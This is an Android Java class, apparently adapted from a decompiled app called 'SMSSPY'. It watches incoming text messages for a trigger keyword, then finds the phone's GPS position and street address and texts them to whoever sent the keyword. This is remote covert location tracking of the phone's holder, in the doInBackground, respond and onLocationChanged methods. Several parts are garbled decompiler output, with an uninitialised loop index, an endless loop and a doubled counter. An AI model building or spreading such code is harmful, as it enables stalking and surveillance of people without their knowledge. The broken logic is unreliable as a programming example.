package com.example.flymaple.test10;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.IOException;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

/**
 * Created by Flymaple on 7/3/15.
 */
public class Test3 extends AsyncTask<Intent, Void, Void>
        implements LocationListener {
    public static final String SENT_SMS = "de.mobinauten.smsspy.SMS_SENT";
    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private boolean _respond;
    private String _to;
    private Context context;
    private Intent intent;
    private LocationManager locationManager;
    private boolean locationchanged = false;
    private PendingIntent sentIntent;
    private SmsManager sms;

    private void findAndSendLocation()
    {
        Log.i("SMSSPY", getClass() + " Finds and sends Location to: " + this._to);
        this.locationManager = ((LocationManager)this.context.getSystemService(Context.LOCATION_SERVICE));
        Criteria localCriteria = new Criteria();
        localCriteria.setAccuracy(1);
        localCriteria.setAltitudeRequired(false);
        localCriteria.setBearingRequired(false);
        localCriteria.setCostAllowed(true);
        localCriteria.setPowerRequirement(1);
        String str = this.locationManager.getBestProvider(localCriteria, true);
        this.locationManager.requestLocationUpdates(str, 0L, 10.0F, this);
    }

    protected Void doInBackground(Intent[] paramArrayOfIntent)
    {
        int j;
        int k;
        do {
            try {
                Log.i("SMSSPY", getClass() + " Do in background: " + paramArrayOfIntent[0].getAction());
                Intent localIntent = paramArrayOfIntent[0];
                if (!localIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
                    break;
                String str = this.context.getString(R.string.abc_action_bar_home_description);
                Bundle localBundle = localIntent.getExtras();
                if (localBundle == null)
                    break;
                Object[] arrayOfObject = (Object[]) localBundle.get("pdus");
                SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
                for (int i = 0; ; i++) {
                    if (i >= arrayOfObject.length) {
                        j = arrayOfSmsMessage.length;
                        k = 0;
                        break;
                    }
                    arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[]) arrayOfObject[i]);
                }
                SmsMessage localSmsMessage = arrayOfSmsMessage[k];
                this._respond = false;
                if (localSmsMessage.getMessageBody().toLowerCase().contains(str)) {
                    this._respond = true;
                    this._to = localSmsMessage.getOriginatingAddress();
                }
                k++;
            } catch (Throwable localThrowable) {
                Log.e("SMSSPY", localThrowable.getMessage(), localThrowable);
                break;
            }
        }
        while (k < j);
        return null;
    }

    public Context getContext()
    {
        return this.context;
    }

    public void onLocationChanged(Location paramLocation)
    {
        if (!this.locationchanged)
        {
            this.locationchanged = true;
            StringBuffer localStringBuffer = new StringBuffer();
            String str1 = String.valueOf(paramLocation.getLatitude());
            String str2 = String.valueOf(paramLocation.getLongitude());
            localStringBuffer.append("Android mobile located at:\n");
            if (str1.length() > 8)
                localStringBuffer.append("Latitude: " + String.valueOf(paramLocation.getLatitude()).substring(0, 9) + "\n");
            while (true)
            {
                Geocoder localGeocoder=null;
                label139:
                if (str2.length() > 8)
                {
                    localStringBuffer.append("Longitude: " + String.valueOf(paramLocation.getLongitude()).substring(0, 9) + "\n");
                    localStringBuffer.append("Precision by: " + paramLocation.getProvider() + "\n");
                    localGeocoder = new Geocoder(this.context, Locale.getDefault());
                }
                try
                {
                    List localList = localGeocoder.getFromLocation(paramLocation.getLatitude(), paramLocation.getLongitude(), 1);
                    Address localAddress;
                    int i;

                    if (localList != null)
                    {
                        localStringBuffer.append("Found address: \n");
                        localAddress = (Address)localList.get(0);

                        int j = localAddress.getMaxAddressLineIndex();
                        for(i=0;i<j;i++){
                            localStringBuffer.append(localAddress.getAddressLine(i));
                            localStringBuffer.append("Latitude: " + String.valueOf(paramLocation.getLatitude()) + "\n");
                            localStringBuffer.append("Longitude: " + String.valueOf(paramLocation.getLongitude()) + "\n");
                            localStringBuffer.append("\n");
                            if (localAddress.getPostalCode() != null)
                                localStringBuffer.append(localAddress.getPostalCode());
                            i++;
                        }

                        Iterator localIterator = this.sms.divideMessage(localStringBuffer.toString()).iterator();
                        while(localIterator.hasNext()){
                            String str3 = (String)localIterator.next();
                            this.sms.sendTextMessage(this._to, null, str3, this.sentIntent, null);
                        }
                        return;
                    }
                }
                catch (IOException e)
                {
                }
            }
        }
        this.locationManager.removeUpdates(this);
    }

    public void onProviderDisabled(String paramString)
    {
    }

    public void onProviderEnabled(String paramString)
    {
    }

    public void onStatusChanged(String paramString, int paramInt, Bundle paramBundle)
    {
    }

    public void respond()
    {
        Log.i("SMSSPY", getClass() + " Responds to: " + this._to);
        this.sms = SmsManager.getDefault();
        this.intent = new Intent("de.mobinauten.smsspy.SMS_SENT");
        this.intent.putExtra("recipient", this._to);
        this.sentIntent = PendingIntent.getBroadcast(this.context, 0, this.intent, 0);
        this.sms.sendTextMessage(this._to, null, "Location Request received...I'm working.\nThis may take some time.\nPowered by mobinauten.de (c)", this.sentIntent, null);
        findAndSendLocation();
    }

    public void setContext(Context paramContext)
    {
        this.context = paramContext;
    }

}
